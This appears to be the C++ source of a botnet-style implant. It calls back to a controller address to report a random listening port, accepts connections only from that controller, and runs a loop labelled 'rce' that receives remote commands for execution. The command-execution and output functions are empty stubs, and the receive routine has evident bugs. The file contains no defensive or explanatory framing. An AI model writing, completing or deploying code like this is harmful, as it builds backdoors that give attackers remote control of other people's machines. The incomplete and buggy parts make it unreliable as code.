#include "bot.hpp"
#include <arpa/inet.h>
#include <iostream>
#include <netinet/in.h>
#include <random>
#include <string>
#include <sys/socket.h>
#include <system_error>
#include <unistd.h>
#include <cstdio>

Bot::Bot(const sockaddr_in *cbaddr) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> distrib(30000, 50000);

    m_listener = -1;
    m_rce = -1;
    m_listener_port = distrib(gen);
    m_callback_addr = *cbaddr;
    m_running = false;
}

Bot::~Bot() {
    stop_listener();

    if (m_listener_thread.joinable()) {
        m_listener_thread.join();
    }
}

int Bot::callback() {
    int res;
    int sockfd;
    std::string port = std::to_string(m_listener_port);

    std::cout << "INFO: Calling back to " << inet_ntoa(m_callback_addr.sin_addr) << ":" << ntohs(m_callback_addr.sin_port) << "\n";
    res = socket(AF_INET, SOCK_STREAM, 0);
    if (res == -1) {
        std::cout << "FAIL: Failed to create callback socket\n";
        return -1;
    }
    sockfd = res;

    res = connect(sockfd, (sockaddr *)&m_callback_addr,
                  (socklen_t)sizeof(m_callback_addr));
    if (res == -1) {
        std::cout << "FAIL: Failed to connect to callback listener\n";
        close(sockfd);
        return -1;
    }

    res = send(sockfd, port.c_str(), port.size(), 0);
    if (res == -1) {
        std::cout << "FAIL: Failed to send listener port\n";
        close(sockfd);
        return -1;
    }

    res = close(sockfd);
    std::cout << "SUCCESS: Called back\n";
    return 0;
}

int Bot::start_listener() {
    int res;

    std::cout << "INFO: Creating Listener on " << m_listener_port << "\n";
    res = create_listener();
    if (res == -1) {
        std::cout << "FAIL: Failed to create listener\n";
        stop_listener();
        return -1;
    }
    std::cout << "SUCCESS: Created listener\n";
    m_listener = res;

    std::cout << "INFO: Starting accept loop\n";
    res = background_listener();
    if (res == -1) {
        std::cout << "FAIL: Failed to background thread\n";
        stop_listener();
        return -1;
    }

    std::cout << "SUCCESS: Backgrounded thread\n";
    return 0;
}

int Bot::stop_listener() {

    if (is_listening()) {
        close(m_listener);
    }

    if (is_running()) {
        m_running = false;
    }

    return 0;
}

void Bot::rce_loop() {
    std::string cmd;
    std::string output;

    while (true) {
        if (!is_connected()) {
            std::cout << "INFO: Waiting for connection...\n";
            sleep(10);
            continue;
        }

        std::cout << "INFO: Waiting for command...\n";
        cmd = get_command();
        std::cout.flush();
        std::cout << "COMMAND: " << cmd << "\n";
        output = execute_command(cmd);
        std::cout << "OUTPUT: " << output << "\n";
    }
}

int Bot::background_listener() {
    try {
        m_listener_thread = std::thread(&Bot::accept_loop, this);
    } catch (const std::system_error &e) {
        std::cout << "EXCEPTION: " << e.what() << "\n";
        return -1;
    }

    return 0;
}

int Bot::create_listener() {
    int res;
    int lfd;
    sockaddr_in laddr;
    laddr.sin_family = AF_INET;
    laddr.sin_addr.s_addr = INADDR_ANY;
    laddr.sin_port = htons(m_listener_port);

    res = socket(AF_INET, SOCK_STREAM, 0);
    if (res == -1) {
        return -1;
    }
    lfd = res;

    res = bind(lfd, (sockaddr *)&laddr, (socklen_t)sizeof(laddr));
    if (res == -1) {
        close(lfd);
        return -1;
    }

    res = listen(lfd, 5);
    if (res == -1) {
        close(lfd);
        return -1;
    }

    return lfd;
}

bool Bot::is_listening() { return m_listener > -1; }

bool Bot::is_running() { return m_running; }

void Bot::accept_loop() {
    if (!is_listening()) {
        return;
    }
    int res;
    m_running = true;
    sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    while (m_running) {
        res = accept(m_listener, (sockaddr *)&addr, &addr_len);
        if (res == -1) {
            continue;
        }

        if (addr.sin_addr.s_addr != m_callback_addr.sin_addr.s_addr) {
            close(res);
            continue;
        }

        m_rce = res;
    }
}

std::string Bot::get_command() {
    ssize_t res;
    size_t total = 0;
    size_t buff_size = 4096;
    char buff[buff_size];
    std::string cmd;
    cmd.clear();

    while (true) {
        res = recv(m_rce, buff, buff_size, 0);
        if (res == -1) {
            break;
        }

        if (res == 0) {
            close(m_rce);
            m_rce = -1;
            break;
        }

        total += res;
        cmd.append(buff);
        if (cmd.find("\n", 0)) {
            break;
        }
    }

    cmd.pop_back();
    cmd.resize(total);
    return cmd;
}

std::string Bot::execute_command(std::string cmd) {}

int Bot::send_output(std::string output) {}

bool Bot::is_connected() {
    return m_rce > -1;
}